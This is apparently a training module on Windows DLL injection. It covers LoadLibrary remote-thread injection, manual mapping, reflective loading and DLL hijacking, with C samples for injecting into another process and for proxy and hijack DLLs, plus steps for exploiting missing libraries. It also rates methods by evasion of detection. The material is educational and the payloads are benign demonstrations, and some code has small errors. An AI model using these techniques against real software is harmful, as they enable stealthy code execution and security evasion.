# Section 20: DLL Injection

---

## Overview

> [!info] What is DLL Injection?
> **DLL Injection** is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.

### Legitimate Use Cases

DLL injection has legitimate applications in various areas:

- **Hot Patching**: Seamless amendment or updating of code without requiring process restart
- **Azure Hot Patching**: [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works) facilitates updates without server downtime

### Malicious Use

Cybercriminals manipulate DLL injection to insert malicious code into trusted processes, making it particularly effective for:
- Evading detection by security software
- Gaining unauthorized access to process resources
- Establishing persistence mechanisms

## DLL Injection Methods

There are several different methods for executing DLL injection. This section covers four main techniques:

1. [LoadLibrary](##loadlibrary)
2. [Manual Mapping](##manual-mapping)
3. [Reflective DLL Injection](##reflective-dll-injection)
4. [DLL Hijacking](##dll-hijacking)

## LoadLibrary

### Overview

`LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.

> [!info] What is LoadLibrary?
> The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process's memory and returns a handle that can be used to get the addresses of functions within the DLL.

### Legitimate Loading (Same Process)

The first example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");
    
    return 0;
}
```

### DLL Injection via LoadLibrary (Remote Process)

The second example illustrates the use of `LoadLibrary` for DLL injection into a remote process:

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456; // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }
    
    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }
    
    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }
    
    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }
    
    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }
    
    printf("Successfully injected example.dll into target process\n");
    
    return 0;
}
```

> [!note] LoadLibrary Injection Process
> 1. Open handle to target process using `OpenProcess()`
> 2. Allocate memory in remote process via `VirtualAllocEx()`
> 3. Write DLL path to remote memory using `WriteProcessMemory()`
> 4. Get address of `LoadLibraryA` from kernel32.dll
> 5. Create remote thread starting at LoadLibrary pointing to DLL path
> 6. Remote process loads DLL and executes it in its context

## Manual Mapping

### Overview

`Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations.

### Key Advantage

Manual Mapping **avoids easy detection** by:
- Not using the `LoadLibrary` function
- Bypassing monitoring by security and anti-cheat systems
- Loading DLL from memory rather than disk

### Process Steps

A simplified outline of the process can be represented as follows:

1. **Load the DLL as raw data** into the injecting process
2. **Map the DLL sections** into the targeted process
3. **Inject shellcode** into the target process and execute it

The injected shellcode then:
- Relocates the DLL
- Rectifies the imports
- Executes the Thread Local Storage (TLS) callbacks
- Calls the DLL main entry point

> [!warning] Complexity
> Manual Mapping is one of the most complex DLL injection techniques and requires:
> - Deep understanding of PE file format
> - Knowledge of process memory management
> - Careful handling of relocations and imports
> - Shellcode development expertise

## Reflective DLL Injection

### Overview

`Reflective DLL Injection` is a technique that utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable (PE) file loader.

### Key Advantages

- Allows DLL to decide how it will load and interact with the host
- Minimizes interaction with the host system and process
- Reduces suspicious API calls

### Resource

[Stephen Fewer has a great GitHub demonstrating the technique](https://github.com/stephenfewer/ReflectiveDLLInjection)

### Detailed Process

Assuming code execution in the host process and the library already written to arbitrary memory location, Reflective DLL Injection functions as follows:

**Step 1: Transfer Control to ReflectiveLoader**

```
Execution control is transferred to the library's ReflectiveLoader function, 
an exported function found in the library's export table. This can happen either 
via CreateRemoteThread() or a minimal bootstrap shellcode.
```

**Step 2: Locate Self in Memory**

```
As the library's image currently resides in an arbitrary memory location, 
the ReflectiveLoader initially calculates its own image's current memory location 
to parse its own headers for later use.
```

**Step 3: Obtain Required Function Addresses**

```
The ReflectiveLoader then parses the host process's kernel32.dll export table 
to calculate the addresses of three functions needed by the loader:
- LoadLibraryA
- GetProcAddress
- VirtualAlloc
```

**Step 4: Allocate Memory for New Image**

```
The ReflectiveLoader now allocates a continuous memory region where it will 
proceed to load its own image. The location isn't crucial; the loader will 
correctly relocate the image later.
```

**Step 5: Load Headers and Sections**

```
The library's headers and sections are loaded into their new memory locations.
```

**Step 6: Process Import Table**

```
The ReflectiveLoader then processes the newly loaded copy of its image's 
import table, loading any additional libraries and resolving their respective 
imported function addresses.
```

**Step 7: Process Relocation Table**

```
The ReflectiveLoader then processes the newly loaded copy of its image's 
relocation table.
```

**Step 8: Call Entry Point**

```
The ReflectiveLoader then calls its newly loaded image's entry point function, 
DllMain, with DLL_PROCESS_ATTACH. The library has now been successfully 
loaded into memory.
```

**Step 9: Return to Bootstrap**

```
Finally, the ReflectiveLoader returns execution to the initial bootstrap shellcode 
that called it, or if it were called via CreateRemoteThread, the thread would terminate.
```

## DLL Hijacking

### Overview

`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL.

### Safe DLL Search Mode

The default DLL search order depends on whether `Safe DLL Search Mode` is activated.

#### Enabling/Disabling Safe DLL Search Mode

1. Press `Windows key + R` to open the Run dialog box
2. Type in `Regedit` and press `Enter` to open the Registry Editor
3. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`
4. In the right pane, look for the `SafeDllSearchMode` value
   - If it does not exist, right-click and select `New` → `DWORD (32-bit) Value`
   - Name this new value as `SafeDllSearchMode`
5. Double-click `SafeDllSearchMode`
6. In the Value data field:
   - Enter `1` to **enable** Safe DLL Search Mode
   - Enter `0` to **disable** Safe DLL Search Mode
7. Click `OK`, close Registry Editor and **Reboot** for changes to take effect

### DLL Search Order (Safe Mode Enabled)

When Safe DLL Search Mode is **enabled** (default), applications search in this order:

1. The directory from which the application is loaded
2. The system directory
3. The 16-bit system directory
4. The Windows directory
5. The current directory
6. The directories listed in the PATH environment variable

### DLL Search Order (Safe Mode Disabled)

When Safe DLL Search Mode is **disabled**, the search order changes to:

1. The directory from which the application is loaded
2. **The current directory** (moved up)
3. The system directory
4. The 16-bit system directory
5. The Windows directory
6. The directories listed in the PATH environment variable

> [!danger] Risk with Safe Mode Disabled
> Disabling Safe DLL Search Mode increases vulnerability to hijacking by 
> searching the current directory earlier in the search order.

### DLL Hijacking Process

DLL Hijacking involves the following steps:

**Step 1: Identify Target DLL**

First, pinpoint a DLL the target is attempting to locate. Specific tools can simplify this task:

- **Process Explorer**: Part of Microsoft's Sysinternals suite, offers detailed information on running processes, including their loaded DLLs
  - Select a process and inspect properties to view its DLLs
  - Resource: https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer

- **PE Explorer**: Portable Executable (PE) Explorer can open and examine PE files (.exe or .dll)
  - Shows DLLs from which the file imports functionality

**Step 2: Identify Functions to Modify**

After identifying a DLL, determine which functions you want to modify using:
- Reverse engineering tools
- Disassemblers (e.g., IDA Pro, Ghidra)
- Debuggers (e.g., WinDbg, x64dbg)

**Step 3: Construct Replacement DLL**

Once functions and their signatures are identified, construct the DLL.

## DLL Hijacking: Practical Example

### Target Application

Consider the C program below:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput() {
    int value;
    char input[100];
    bool isValid = false;
    
    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);
        
        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }
    
    return value;
}

int main() {
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }
    
    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");
    
    printf("Enter the first number: ");
    int a = readIntegerInput();
    
    printf("Enter the second number: ");
    int b = readIntegerInput();
    
    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);
    
    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

> [!note] Application Behavior
> - Loads an `add` function from `library.dll`
> - Uses this function to add two numbers
> - Prints the result of the addition
> - Loads `x.dll` (which may not exist)

Use **Process Monitor (procmon)** to analyze DLL loading:

1. Set up a filter in procmon to include `main.exe` only
2. Note: procmon only captures while actively running
3. Close `main.exe` and reopen it while procmon is running to capture data

## Attack Method 1: Proxying

### Overview

DLL Proxying allows hijacking by creating a new library that intercepts function calls. The proxy:
1. Loads the original function from the actual library
2. Tampers with it
3. Returns it to the calling process

### Steps

1. **Create a new library** serving as the proxy for `library.dll`
2. **Load the original function** (e.g., `Add`) from `library.dll`
3. **Tamper with the function** (modify its behavior/results)
4. **Return the modified function** to the calling application

### Proxy DLL Implementation

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b) {
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

### Exploitation Steps

1. Either compile `tamper.c` or use the precompiled version provided
2. Rename original `library.dll` to `library.o.dll`
3. Rename `tamper.dll` to `library.dll`
4. Run `main.exe`

### Expected Result

```
Enter the first number: 1
Enter the second number: 1
============ HIJACKED ============
= Adding 1 to the sum to be evil
============ RETURN ============
The sum of 1 and 1 is 3
```

> [!success] Successful Hijack
> The application receives 3 instead of the correct sum of 2, demonstrating successful tampering

## Attack Method 2: Invalid Libraries

### Overview

Another DLL hijacking approach exploits applications searching for DLLs they cannot find. An attacker replaces a missing DLL with a crafted one.

### Identification Process

1. In Process Monitor, filter for entries with:
   - File paths ending in `.dll`
   - Status of `NAME NOT FOUND`

2. This reveals libraries the application attempts to load but cannot find

### Example from procmon

```
17:55:39,7848570    main.exe    37940   CreateFile  C:\Users\PandaSt0rm\Desktop\Hijack\x.dll    NAME NOT FOUND  
Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, 
Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

> [!note] Key Finding
> The application searches for `x.dll` from the app directory but doesn't find it
> We can exploit this and provide our own malicious `x.dll`

### Invalid DLL Implementation

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

> [!info] DllMain Entry Point
> This code defines a DLL entry point function that is automatically called by Windows 
> when the DLL is loaded into a process. When loaded, it prints "Hijacked... Oops..." 
> but you could theoretically do anything here (reverse shell, persistence, etc.)

### Exploitation Steps

1. Either compile the code or use the precompiled `hijack.dll`
2. Rename `hijack.dll` to `x.dll`
3. Place `x.dll` in the application directory
4. Run `main.exe`

### Expected Result

```
Hijacked... Oops...
Enter the first number: 1
Enter the second number: 1
The sum of 1 and 1 is 2
```

> [!success] Successful Injection
> The DLL code executed before the application logic, 
> demonstrating successful hijacking via invalid library

## Comparison of DLL Hijacking Methods

| Method                       | Detection Risk                                | Complexity | Use Case                                       |
| ---------------------------- | --------------------------------------------- | ---------- | ---------------------------------------------- |
| **Proxying**                 | Medium (requires function implementation)     | High       | Transparent tampering with specific functions  |
| **Invalid Libraries**        | Low (application doesn't know what to expect) | Low        | Generic code injection when library is missing |
| **LoadLibrary Injection**    | High (monitored by security)                  | Medium     | Direct process injection                       |
| **Manual Mapping**           | Very Low (avoids suspicious APIs)             | Very High  | Stealth operations, anti-cheat bypass          |
| **Reflective DLL Injection** | Low (minimal API calls)                       | Very High  | Memory-resident loading without disk access    |

## Key Takeaways

- [ ] DLL Injection allows inserting code into running processes for both legitimate and malicious purposes
- [ ] **LoadLibrary** is the most straightforward but easily detected method
- [ ] **Manual Mapping** and **Reflective DLL Injection** avoid suspicious API calls but are complex
- [ ] **DLL Hijacking** exploits the DLL search order to load malicious libraries
- [ ] Safe DLL Search Mode affects the search order; disabling it increases hijacking risk
- [ ] Process Monitor (procmon) and Process Explorer are essential for identifying hijacking opportunities
- [ ] Proxying allows transparent function tampering; invalid libraries provide basic code execution
- [ ] The DLL search order is critical to understanding and exploiting DLL loading mechanisms
